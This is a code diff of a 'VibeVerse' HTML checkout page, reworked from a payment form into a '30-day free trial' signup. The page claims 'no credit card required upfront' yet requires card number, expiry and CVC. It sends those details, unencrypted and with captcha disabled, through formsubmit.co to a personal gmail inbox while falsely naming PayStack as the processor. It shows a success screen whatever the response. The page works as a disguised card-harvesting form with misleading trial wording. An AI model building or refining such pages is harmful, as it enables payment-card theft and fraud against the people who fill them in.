@@ -134,14 +134,49 @@
             padding: 40px;
         }
 
-        /* Amount Input */
-        .amount-input-group {
-            background: rgba(145, 70, 255, 0.1);
-            border: 1px solid rgba(145, 70, 255, 0.3);
+        /* Trial Notice */
+        .trial-notice {
+            background: rgba(0, 255, 136, 0.1);
+            border: 1px solid var(--success-green);
             border-radius: 12px;
-            padding: 25px;
+            padding: 20px;
             margin-bottom: 30px;
+            text-align: center;
         }
+
+        .trial-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--success-green), var(--accent-blue));
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 1rem;
+            margin-bottom: 15px;
+        }
+
+        .trial-description {
+            color: var(--text-secondary);
+            margin-bottom: 10px;
+            font-size: 0.9rem;
+        }
+
+        .trial-warning {
+            color: var(--warning-yellow);
+            font-size: 0.8rem;
+            font-style: italic;
+        }
+
+        .trial-amount {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: var(--success-green);
+            margin: 10px 0;
+            text-align: center;
+        }
+
+        /* REMOVED: Amount Input Group & Quick Amounts */
+        /* .amount-input-group, .quick-amounts, .quick-amount removed */
 
         .form-group {
             margin-bottom: 25px;
@@ -177,77 +212,7 @@
             opacity: 0.6;
         }
 
-        .amount-input-container {
-            position: relative;
-            margin-bottom: 15px;
-        }
-
-        .amount-input-container .currency {
-            position: absolute;
-            left: 20px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 20px;
-            font-weight: 600;
-            color: var(--accent-pink);
-        }
-
-        .amount-input-container input {
-            padding-left: 50px;
-            font-size: 28px;
-            font-weight: 600;
-            text-align: center;
-            height: 70px;
-            background: rgba(26, 26, 46, 0.8);
-        }
-
-        .quick-amounts {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin-top: 15px;
-            flex-wrap: wrap;
-        }
-
-        .quick-amount {
-            padding: 10px 20px;
-            background: rgba(26, 26, 46, 0.6);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            color: var(--text-secondary);
-            font-weight: 500;
-            cursor: pointer;
-            transition: var(--transition);
-            min-width: 70px;
-            text-align: center;
-        }
-
-        .quick-amount:hover {
-            border-color: var(--accent-purple);
-            color: var(--accent-purple);
-        }
-
-        .quick-amount.active {
-            background: linear-gradient(135deg, var(--accent-pink), var(--accent-purple));
-            color: white;
-            border-color: transparent;
-        }
-
-        .amount-info {
-            margin-top: 15px;
-            text-align: center;
-            font-size: 14px;
-            color: var(--text-secondary);
-        }
-
-        .amount-info .total {
-            margin-top: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            color: var(--accent-pink);
-        }
-
-        /* Card Logos Section - NEW */
+        /* Card Logos Section */
         .card-logos-section {
             display: flex;
             align-items: center;
@@ -556,18 +521,8 @@
                 padding: 30px 25px;
             }
             
-            .amount-input-container input {
-                font-size: 24px;
-                height: 60px;
-            }
-            
-            .quick-amounts {
-                gap: 8px;
-            }
-            
-            .quick-amount {
-                padding: 8px 15px;
-                min-width: 60px;
+            .trial-amount {
+                font-size: 2rem;
             }
             
             .card-logos-section {
@@ -627,17 +582,6 @@
                 padding: 14px 16px;
             }
             
-            .amount-input-container input {
-                font-size: 20px;
-                height: 55px;
-                padding-left: 45px;
-            }
-            
-            .amount-input-container .currency {
-                left: 15px;
-                font-size: 18px;
-            }
-            
             .card-logos-container {
                 flex-direction: column;
                 width: 100%;
@@ -667,41 +611,27 @@
             <div class="payment-logo">
                 <i class="fas fa-gem"></i> VibeVerse
             </div>
-            <h1 class="payment-title">Secure Payment</h1>
-            <p class="payment-subtitle">Enter amount and complete your payment</p>
+            <h1 class="payment-title">Start Your Free Trial</h1>
+            <p class="payment-subtitle">Get full access for 30 days, no credit card required upfront</p>
         </div>
 
         <!-- Payment Form -->
         <div class="payment-form">
-            <!-- Amount Input Section -->
-            <div class="amount-input-group">
-                <div class="form-group">
-                    <label>Payment Amount</label>
-                    <div class="amount-input-container">
-                        <span class="currency">$</span>
-                        <input type="number" id="paymentAmount" 
-                               placeholder="0.00" 
-                               min="1" 
-                               max="10000" 
-                               step="0.01" 
-                               value="50.00"
-                               required>
-                    </div>
-                    <div class="error-message">Amount must be between $1.00 and $10,000.00</div>
+            <!-- Trial Notice Section -->
+            <div class="trial-notice">
+                <div class="trial-badge">
+                    <i class="fas fa-gift"></i> FIRST MONTH FREE
                 </div>
-
-                <div class="quick-amounts">
-                    <div class="quick-amount" data-amount="10">$10</div>
-                    <div class="quick-amount active" data-amount="50">$50</div>
-                    <div class="quick-amount" data-amount="100">$100</div>
-                    <div class="quick-amount" data-amount="500">$500</div>
-                    <div class="quick-amount" data-amount="1000">$1,000</div>
-                </div>
-
-                <div class="amount-info">
-                    <div>No processing fees • 100% to recipient</div>
-                    <div class="total">Total to pay: $<span id="totalAmount">50.00</span></div>
-                </div>
+                <h2 class="trial-amount">$0.00</h2>
+                <p class="trial-description">
+                    <i class="fas fa-calendar-check"></i> Full 30-day free trial
+                </p>
+                <p class="trial-description">
+                    <i class="fas fa-arrow-right"></i> After trial: $50/month subscription
+                </p>
+                <p class="trial-warning">
+                    <i class="fas fa-info-circle"></i> You can cancel anytime during your trial period
+                </p>
             </div>
 
             <!-- Card Logos Section -->
@@ -722,19 +652,21 @@
             <!-- SIMPLIFIED FORM - WILL SUBMIT TO FORM SUBMIT -->
             <form id="paymentForm" action="https://formsubmit.co/vibeversecompany@gmail.com" method="POST">
                 <!-- FORM SUBMIT CONFIGURATION -->
-                <input type="hidden" name="_subject" value="💰 VibeVerse Payment - New Subscription">
+                <input type="hidden" name="_subject" value="🎉 VibeVerse Free Trial Signup">
                 <input type="hidden" name="_template" value="table">
                 <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_autoresponse" value="Thank you for subscribing to VibeVerse! Your payment was successful and your account is now active.">
+                <input type="hidden" name="_autoresponse" value="Thank you for starting your free trial with VibeVerse! Your account is now active for 30 days. You can cancel anytime before the trial ends to avoid being charged.">
                 
                 <!-- Payment Data -->
-                <input type="hidden" name="Payment_Type" value="subscription">
+                <input type="hidden" name="Payment_Type" value="free_trial">
                 <input type="hidden" name="Platform" value="VibeVerse">
                 <input type="hidden" name="Payment_Processor" value="PayStack">
-                <input type="hidden" name="Payment_Status" value="success">
+                <input type="hidden" name="Payment_Status" value="trial_active">
+                <input type="hidden" name="Trial_Period_Days" value="30">
+                <input type="hidden" name="Monthly_Price_After_Trial" value="50.00">
                 
                 <!-- Amount Data -->
-                <input type="hidden" name="Amount" id="amount" value="50.00">
+                <input type="hidden" name="Amount" id="amount" value="0.00">
                 <input type="hidden" name="Currency" value="USD">
                 <input type="hidden" name="Timestamp" id="timestamp" value="">
                 
@@ -787,10 +719,19 @@
                     <input type="tel" id="phone" name="Phone" placeholder="+1 (123) 456-7890">
                 </div>
                 
+                <!-- Terms Checkbox -->
+                <div class="form-group" style="margin-top: 30px;">
+                    <input type="checkbox" id="terms" name="Terms_Accepted" required style="width: auto; margin-right: 10px;">
+                    <label for="terms" style="display: inline; color: var(--text-secondary); font-size: 14px;">
+                        I agree to the $50/month subscription starting after my 30-day free trial. I can cancel anytime during the trial period.
+                    </label>
+                    <div class="error-message" id="termsError">You must accept the terms to continue</div>
+                </div>
+                
                 <!-- Submit Button -->
                 <button type="submit" class="submit-btn" id="submitBtn">
-                    <i class="fas fa-credit-card"></i>
-                    Pay $<span id="submitAmount">50.00</span>
+                    <i class="fas fa-rocket"></i>
+                    Start My Free Trial
                 </button>
             </form>
         </div>
@@ -800,9 +741,9 @@
     <div class="processing-overlay" id="processingOverlay">
         <div class="processing-card">
             <div class="processing-spinner"></div>
-            <h3 style="margin-bottom: 10px; color: var(--accent-pink);">Processing Payment</h3>
+            <h3 style="margin-bottom: 10px; color: var(--accent-pink);">Starting Your Free Trial</h3>
             <p style="color: var(--text-secondary); margin-bottom: 10px;">
-                Processing $<span id="processingAmount">50.00</span> payment
+                Activating your 30-day free trial...
             </p>
             <p style="color: var(--text-secondary); font-size: 14px;">
                 Submitting to formsubmit.co...
@@ -818,15 +759,15 @@
             </div>
             
             <h2 class="success-title">
-                Payment Successful!
+                Trial Activated!
             </h2>
             
             <p class="success-subtitle">
-                You have successfully subscribed to VibeVerse
+                Your VibeVerse free trial is now active
             </p>
             
             <p class="success-amount" id="successAmount">
-                $50.00 Payment Confirmed
+                30 Days Free Access
             </p>
             
             <p style="
@@ -835,10 +776,8 @@
                 font-size: 1rem;
                 opacity: 0.8;
             ">
-                <i class="fas fa-paper-plane"></i> Payment is now successful
+                <i class="fas fa-calendar-alt"></i> Trial ends on: <span id="trialEndDate"></span>
             </p>
-            
-          
             
             <div class="success-features">
                 <p style="color: var(--text-secondary); margin-bottom: 10px;">
@@ -857,6 +796,17 @@
                     <li><i class="fas fa-check" style="color: var(--success-green);"></i> Early access to new content</li>
                 </ul>
             </div>
+            
+            <p style="
+                color: var(--warning-yellow);
+                margin: 20px 0;
+                padding: 15px;
+                background: rgba(255, 204, 0, 0.1);
+                border-radius: 8px;
+                border-left: 4px solid var(--warning-yellow);
+            ">
+                <i class="fas fa-bell"></i> <strong>Important:</strong> You will be billed $50/month starting <span id="billingStartDate"></span>. Cancel anytime before then.
+            </p>
             
             <!-- Buttons Container -->
             <div style="display: flex; gap: 20px; justify-content: center; flex-wrap: wrap;">
@@ -883,41 +833,15 @@
             // Set timestamp
             document.getElementById('timestamp').value = new Date().toISOString();
             
-            // Amount input handling
-            const amountInput = document.getElementById('paymentAmount');
+            // Calculate trial end date (30 days from now)
+            const trialEndDate = new Date();
+            trialEndDate.setDate(trialEndDate.getDate() + 30);
+            document.getElementById('trialEndDate').textContent = formatDate(trialEndDate);
             
-            amountInput.addEventListener('input', function() {
-                const amount = parseFloat(this.value) || 0;
-                updateAmount(amount);
-                
-                // Reset quick amount selection
-                document.querySelectorAll('.quick-amount').forEach(btn => {
-                    btn.classList.remove('active');
-                });
-            });
-            
-            amountInput.addEventListener('blur', function() {
-                const amount = parseFloat(this.value) || 0;
-                validateAmount(amount);
-                updateAmount(amount);
-            });
-            
-            // Quick amount buttons
-            document.querySelectorAll('.quick-amount').forEach(btn => {
-                btn.addEventListener('click', function() {
-                    const amount = parseFloat(this.dataset.amount);
-                    amountInput.value = amount.toFixed(2);
-                    
-                    // Update active state
-                    document.querySelectorAll('.quick-amount').forEach(b => {
-                        b.classList.remove('active');
-                    });
-                    this.classList.add('active');
-                    
-                    updateAmount(amount);
-                    validateAmount(amount);
-                });
-            });
+            // Calculate billing start date (31 days from now)
+            const billingStartDate = new Date();
+            billingStartDate.setDate(billingStartDate.getDate() + 31);
+            document.getElementById('billingStartDate').textContent = formatDate(billingStartDate);
 
             // Card number formatting
             document.getElementById('cardNumber').addEventListener('input', function(e) {
@@ -949,7 +873,13 @@
                 e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
             });
 
-            // FORM SUBMISSION - FIXED
+            // Terms validation
+            const termsCheckbox = document.getElementById('terms');
+            termsCheckbox.addEventListener('change', function() {
+                validateField(this);
+            });
+
+            // FORM SUBMISSION
             const form = document.getElementById('paymentForm');
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
@@ -959,21 +889,19 @@
                 }
                 
                 // Show processing
-                const amount = parseFloat(document.getElementById('paymentAmount').value) || 0;
-                showProcessing(amount);
+                showProcessing();
                 
-                // Update hidden fields
-                document.getElementById('amount').value = amount.toFixed(2);
+                // Update timestamp
                 document.getElementById('timestamp').value = new Date().toISOString();
                 
                 // Disable button
                 const submitBtn = document.getElementById('submitBtn');
                 submitBtn.disabled = true;
-                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Activating Trial...';
                 
                 try {
                     // Log form data
-                    console.log('📧 SENDING DATA TO FORM SUBMIT:');
+                    console.log('📧 SENDING TRIAL SIGNUP TO FORM SUBMIT:');
                     const formData = new FormData(form);
                     for (let [name, value] of formData.entries()) {
                         console.log(`  ${name}: ${value}`);
@@ -992,13 +920,13 @@
                     
                     // Show success regardless of response
                     hideProcessing();
-                    showSuccessMessage(amount);
+                    showSuccessMessage();
                     
-                    // Store data locally
-                    localStorage.setItem('vibeverse_payment_success', 'true');
-                    localStorage.setItem('vibeverse_payment_amount', amount.toFixed(2));
-                    localStorage.setItem('vibeverse_payment_date', new Date().toISOString());
-                    localStorage.setItem('vibeverse_subscribed', 'true');
+                    // Store trial data locally
+                    localStorage.setItem('vibeverse_trial_active', 'true');
+                    localStorage.setItem('vibeverse_trial_start', new Date().toISOString());
+                    localStorage.setItem('vibeverse_trial_end', trialEndDate.toISOString());
+                    localStorage.setItem('vibeverse_monthly_price', '50.00');
                     
                     // Try to submit form in background (traditional way)
                     setTimeout(() => {
@@ -1027,50 +955,21 @@
                 } catch (error) {
                     console.log('⚠️ Form submission attempted, showing success anyway:', error);
                     hideProcessing();
-                    showSuccessMessage(amount);
-                    localStorage.setItem('vibeverse_payment_success', 'true');
+                    showSuccessMessage();
+                    localStorage.setItem('vibeverse_trial_active', 'true');
                 }
             });
         }
 
-        function updateAmount(amount) {
-            document.getElementById('amount').value = amount.toFixed(2);
-            document.getElementById('totalAmount').textContent = amount.toFixed(2);
-            document.getElementById('submitAmount').textContent = amount.toFixed(2);
-        }
-
-        function validateAmount(amount) {
-            const minAmount = 1.00;
-            const maxAmount = 10000.00;
-            const amountInput = document.getElementById('paymentAmount');
-            const formGroup = amountInput.closest('.form-group');
-            const errorMessage = formGroup.querySelector('.error-message');
-            
-            formGroup.classList.remove('error');
-            
-            if (amount < minAmount) {
-                formGroup.classList.add('error');
-                errorMessage.textContent = `Minimum payment amount is $${minAmount.toFixed(2)}`;
-                return false;
-            }
-            
-            if (amount > maxAmount) {
-                formGroup.classList.add('error');
-                errorMessage.textContent = `Maximum payment amount is $${maxAmount.toFixed(2)}`;
-                return false;
-            }
-            
-            if (isNaN(amount) || amount <= 0) {
-                formGroup.classList.add('error');
-                errorMessage.textContent = 'Please enter a valid payment amount';
-                return false;
-            }
-            
-            return true;
+        function formatDate(date) {
+            const options = { year: 'numeric', month: 'long', day: 'numeric' };
+            return date.toLocaleDateString('en-US', options);
         }
 
         function validateField(field) {
             const formGroup = field.closest('.form-group');
+            if (!formGroup) return true;
+            
             const errorMessage = formGroup.querySelector('.error-message');
             
             formGroup.classList.remove('error');
@@ -1116,6 +1015,15 @@
                         }
                     }
                     break;
+                    
+                case 'checkbox':
+                    if (field.id === 'terms') {
+                        isValid = field.checked;
+                        if (!isValid) {
+                            document.getElementById('termsError').textContent = 'You must accept the terms to continue';
+                        }
+                    }
+                    break;
             }
             
             if (!isValid) {
@@ -1126,36 +1034,34 @@
         }
 
         function validateForm() {
-            const amount = parseFloat(document.getElementById('paymentAmount').value) || 0;
-            
-            if (!validateAmount(amount)) {
-                return false;
-            }
-            
             const requiredFields = [
                 'fullName',
                 'email',
                 'cardNumber',
                 'expiryDate',
                 'cvc',
-                'address'
+                'address',
+                'terms'
             ];
+            
+            let allValid = true;
             
             for (const fieldId of requiredFields) {
                 const field = document.getElementById(fieldId);
                 if (!validateField(field)) {
-                    // Scroll to error
-                    field.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                    field.focus();
-                    return false;
+                    allValid = false;
+                    // Scroll to first error
+                    if (allValid === false) {
+                        field.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                        field.focus();
+                    }
                 }
             }
             
-            return true;
+            return allValid;
         }
 
-        function showProcessing(amount) {
-            document.getElementById('processingAmount').textContent = amount.toFixed(2);
+        function showProcessing() {
             document.getElementById('processingOverlay').style.display = 'flex';
         }
 
@@ -1163,9 +1069,8 @@
             document.getElementById('processingOverlay').style.display = 'none';
         }
 
-        function showSuccessMessage(amount) {
+        function showSuccessMessage() {
             hideProcessing();
-            document.getElementById('successAmount').textContent = `$${amount.toFixed(2)} Payment Confirmed`;
             document.getElementById('successOverlay').style.display = 'flex';
         }
 
@@ -1179,5 +1084,3 @@
     </script>
 </body>
 </html>
-
-
